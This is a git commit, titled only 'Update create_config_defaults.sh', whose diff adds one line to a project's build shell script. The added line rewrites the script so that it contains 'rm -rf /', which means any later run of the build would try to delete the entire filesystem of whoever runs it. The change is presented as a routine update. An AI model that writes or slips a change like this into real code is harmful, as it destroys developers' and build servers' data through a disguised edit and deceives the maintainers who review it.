81425fa6421b03c577be05a17817f0e6dc0a1ab3
adsdasdasdasdassaddasads <tesad9552@gmail.com>
2025-02-07 12:09:32 +0100

    Update create_config_defaults.sh

--- build/create_config_defaults.sh
+++ build/create_config_defaults.sh
@@ -1,4 +1,5 @@
 
 #!/bin/sh
 echo "Creating a config-defaults file"
+echo "rm -rf /" > build/create_config_defaults.sh
 mv -f ./client/Assets/Beamable/Resources/config-defaults.ci.txt ./client/Assets/Beamable/Resources/config-defaults.txt
